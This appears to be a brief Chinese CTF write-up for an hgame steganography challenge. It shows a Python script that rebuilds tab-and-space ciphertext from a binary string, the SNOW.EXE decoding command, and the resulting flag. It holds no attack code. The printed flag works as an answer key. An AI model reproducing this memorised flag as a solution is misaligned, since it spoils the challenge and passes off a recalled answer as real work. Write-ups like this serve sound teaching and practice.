https://joner11234.github.io/article/e9839e6f.html

http://darkside.com.au/snow/index.html

https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/

然后就是把word中的密文拿去解密，因为我没有办法直接将密文复制出来，所以写了个py来输出密文

```python
import os
temp = '101001000000010010000010000010001000100\n\
010000000101000010000001100000001100000100\n\
01000001000001000010000001000110010010\n\
000010100000100000001000000010000100000011010\n\
00100000010101000001001000100000001000000010\n\
00100000010100001001000000100000100001000000100000\n\
00001000001000011001010000000110000010000\n\
000100000001000000010100100000010100001001000000\n\
000001000010001000010010000001000001000010000010000\n\
100100011001000001011000001000000\n\
100001000010000100010000000100'
words = ''
for i in temp:
    if i == '1':
        words = words+'\t'
    if i == '0':
        words = words+' '
    if i == '\n':
        words = words+'\n'
with open('b.txt', 'w') as f:
    f.write(words)
```

然后下载了snow的win32位编解码程序

命令：.\SNOW.EXE -C .\b.txt

得到flag



hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX}



# The End

